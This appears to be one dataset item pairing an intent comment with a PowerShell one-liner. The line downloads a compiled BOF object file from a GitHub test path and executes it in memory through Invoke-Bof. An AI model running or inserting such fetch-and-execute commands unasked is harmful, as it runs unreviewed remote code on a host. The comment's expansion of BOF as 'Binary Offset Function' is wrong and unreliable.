# Natural language intent:
# Download and execute a BOF (Binary Offset Function) payload from a specific URI.

$BOFBytes = (Invoke-WebRequest -Uri 'https://github.com/airbus-cert/Invoke-BOF/raw/main/test/test_invoke_bof.x64.o').Content; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList 'foo', 5
